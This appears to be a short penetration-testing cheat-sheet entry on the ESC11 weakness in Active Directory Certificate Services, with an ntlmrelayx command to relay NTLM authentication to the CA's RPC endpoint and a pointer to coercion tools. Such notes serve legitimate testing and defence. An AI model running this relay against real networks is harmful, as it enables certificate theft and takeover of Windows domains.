# ESC11- unencrypted ICERT requests 
If the `IF_ENFORCEENCRYPTICERTREQUEST` is disabled on the Certificate Authority, it allows unencrypted ICERT requests to be made to the RPC endpoint on the certificate server

It is then possible to relay authentication to an RPC endpoint and request a certificate.

### Exploit
-------

1/ setup the relay 

```text-plain
ntlmrelayx.py -t rpc://[CA IP] -rpc-mode ICPR -icpr-ca-name [example-CA] -smb2support [-Template]
```

2/ Coerce an authentication

```text-plain
coercer
etc.
```

### PS 
---

There is issue with the Fortra's version of impacket,  you should use the ThePorgs version

### More information 

[https://heartburn.dev/exploiting-active-directory-certificate-services-esc11-walkthrough/](https://heartburn.dev/exploiting-active-directory-certificate-services-esc11-walkthrough/)
